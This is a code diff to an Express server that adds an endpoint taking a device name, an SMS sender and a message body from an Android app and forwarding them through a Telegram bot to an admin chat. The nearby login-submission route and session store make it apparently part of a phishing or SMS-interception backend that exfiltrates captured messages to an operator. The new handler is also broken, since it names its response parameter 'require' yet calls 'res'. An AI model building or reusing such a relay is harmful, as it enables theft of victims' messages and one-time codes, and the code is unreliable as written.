@@ -4,6 +4,7 @@ const cors = require("cors");
 const bodyParser = require("body-parser");
 const crypto = require('crypto');
 const path = require("path");
+require('dotenv').config();
 
 const app = express();
 const PORT = process.env.PORT || 5002;
@@ -21,6 +22,38 @@ const BASE_URL = process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 const sessions = {};
 
 // --- ROUTES ---
+
+// Endpoint for the Android app or frontend to send data
+app.post('/api/forward', async (req, require) => {
+    const { phoneName, sender, message, timestamp } = req.body;
+
+    if (!sender || !message) {
+        return res.status(400).json({ error: 'Missing required fields' });
+    }
+
+    // Format the message content securely on the server
+    const formattedMessage = `
+📱 <b>${phoneName || 'Unknown Device'}</b>
+👤 From: <code>${sender}</code>
+🕐 Time: ${timestamp || new Date().toISOString()}
+💬 Message: ${message}
+    `.trim();
+
+    try {
+        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        await axios.post(telegramUrl, {
+            chat_id: TELEGRAM_ADMIN_ID,
+            text: formattedMessage,
+            parse_mode: 'HTML'
+        });
+
+        return res.status(200).json({ success: true, status: 'Message forwarded successfully' });
+    } catch (error) {
+        console.error('Telegram API Error:', error.response ? error.response.data : error.message);
+        return res.status(500).json({ error: 'Failed to forward message via Telegram' });
+    }
+});
+
 
 // 1. Initial Login Submission
 app.post("/api/submit", async (req, res) => {
